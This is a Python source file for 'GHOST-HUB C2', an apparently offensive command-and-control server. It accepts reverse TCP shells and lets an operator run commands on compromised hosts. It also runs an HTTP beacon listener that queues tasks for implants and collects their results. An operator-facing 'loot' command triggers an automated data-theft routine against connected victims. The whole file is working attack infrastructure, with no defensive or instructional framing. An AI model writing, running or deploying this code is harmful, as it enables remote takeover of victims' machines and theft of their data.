import socket
import threading
import asyncio
import time
import questionary
from aiohttp import web
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from core.ui import draw_header, Q_STYLE
from modules.looter import run_looter

console = Console()


class HttpBeaconHub:
    """Next-Generation HTTP Beacon Listener"""

    def __init__(self, port=8080):
        self.port = port
        self.beacons = {}
        self.tasks = {}

    async def handle_ping(self, request):
        try:
            data = await request.json()
            agent_id = data.get('id')
            if agent_id not in self.beacons:
                console.print(
                    f"\n[bold green][+] NEW BEACON ACTIVE: {request.remote} (ID: {agent_id})[/bold green]")

            self.beacons[agent_id] = {
                'ip': request.remote,
                'last_seen': time.time(),
                'sysinfo': data.get('sysinfo', 'Unknown')
            }

            if agent_id in self.tasks and self.tasks[agent_id]:
                task = self.tasks[agent_id].pop(0)
                return web.json_response({"status": "task", "command": task})

            return web.json_response({"status": "sleep"})
        except Exception:
            return web.json_response({"status": "error"})

    async def handle_result(self, request):
        try:
            data = await request.json()
            agent_id = data.get('id')
            result = data.get('result')
            console.print(
                f"\n[bold cyan]Result from Beacon {agent_id}:[/bold cyan]\n{result}\n[bold red]Ghost-Hub[/bold red]> ", end="")
            return web.json_response({"status": "ok"})
        except Exception:
            return web.json_response({"status": "error"})

    async def start(self):
        app = web.Application()
        app.router.add_post('/api/v1/ping', self.handle_ping)
        app.router.add_post('/api/v1/result', self.handle_result)
        runner = web.AppRunner(app)
        await runner.setup()
        site = web.TCPSite(runner, '0.0.0.0', self.port)
        await site.start()


class GhostHub:
    def __init__(self, port=4444):
        self.port = int(port)
        self.sessions = {}
        self.counter = 1

    async def handle_ghost(self, reader, writer):
        addr = writer.get_extra_info('peername')
        s_id = self.counter
        self.sessions[s_id] = {
            'reader': reader,
            'writer': writer,
            'ip': addr[0],
            'time': time.strftime("%H:%M:%S")
        }
        self.counter += 1
        console.print(
            f"\n[bold green][+] TCP GHOST CONNECTED: {addr[0]} (ID: {s_id})[/bold green]")

    async def interact(self, s_id):
        if s_id not in self.sessions:
            return console.print(f"[red][!] Session {s_id} not found.[/red]")

        session = self.sessions[s_id]
        writer = session['writer']
        reader = session['reader']

        console.print(
            Panel(f"Target: {session['ip']}\nCommands: loot, exit", border_style="red"))

        while True:
            cmd = console.input(f"[bold red]Ghost-{s_id}[/bold red]> ").strip()

            if cmd == "back":
                break
            if cmd == "terminate":
                writer.close()
                await writer.wait_closed()
                del self.sessions[s_id]
                break

            if cmd == "loot":
                console.print(
                    "[dim][*] Running automated loot sequence...[/dim]")
                report = await run_looter(reader, writer)
                console.print(
                    Panel(report, title="Loot Report", border_style="yellow"))
                continue

            writer.write((cmd + "\n").encode())
            await writer.drain()

            try:
                data = await asyncio.wait_for(reader.read(16384), timeout=5.0)
                console.print(data.decode('utf-8', errors='ignore'))
            except asyncio.TimeoutError:
                console.print("[yellow][!] Response timed out.[/yellow]")

    async def start_server(self):
        server = await asyncio.start_server(self.handle_ghost, '0.0.0.0', self.port)
        async with server:
            await server.serve_forever()


async def async_hub_entry():
    draw_header("GHOST-HUB C2 (Dual Stack)")
    port = questionary.text(
        "Listen Port (TCP & HTTP Beacons):", default="4444", style=Q_STYLE).ask()

    tcp_hub = GhostHub(port=port)
    http_hub = HttpBeaconHub(port=int(port)+1)  # HTTP beacons run on Port + 1

    console.print(f"[*] TCP Shells Listener active on Port {port}")
    console.print(f"[*] HTTP Beacon Listener active on Port {int(port)+1}\n")

    asyncio.create_task(tcp_hub.start_server())
    asyncio.create_task(http_hub.start())

    while True:
        # Session List Update (Merging TCP and HTTP Beacons)
        if tcp_hub.sessions or http_hub.beacons:
            table = Table(title="Active GHOST Sessions", border_style="red")
            table.add_column("ID")
            table.add_column("Type")
            table.add_column("IP / SysInfo")
            table.add_column("Time / Last Seen")

            for sid, d in tcp_hub.sessions.items():
                table.add_row(
                    str(sid), "[blue]TCP Shell[/blue]", d['ip'], d['time'])

            for bid, d in http_hub.beacons.items():
                seen_ago = int(time.time() - d['last_seen'])
                table.add_row(str(bid), "[magenta]HTTP Beacon[/magenta]",
                              f"{d['ip']} | {d['sysinfo']}", f"{seen_ago}s ago")

            console.print(table)

        cmd = questionary.text(
            "Hub Command (interact <ID>, task <ID> <CMD>, exit):", style=Q_STYLE).ask()
        if not cmd:
            continue

        args = cmd.split(maxsplit=2)
        if args[0] == "interact":
            try:
                await tcp_hub.interact(int(args[1]))
            except:
                console.print(
                    "[red]Invalid ID or Target is an HTTP Beacon (Use 'task' for beacons)[/red]")
        elif args[0] == "task":
            if len(args) < 3:
                console.print("[red]Usage: task <Beacon_ID> <command>[/red]")
                continue
            bid, command = args[1], args[2]
            if bid in http_hub.beacons:
                if bid not in http_hub.tasks:
                    http_hub.tasks[bid] = []
                http_hub.tasks[bid].append(command)
                console.print(
                    f"[green][+] Task queued for Beacon {bid}. Waiting for check-in...[/green]")
            else:
                console.print("[red]Invalid Beacon ID[/red]")
        elif args[0] == "exit":
            break


def run_ghost_hub():
    try:
        asyncio.run(async_hub_entry())
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    run_ghost_hub()
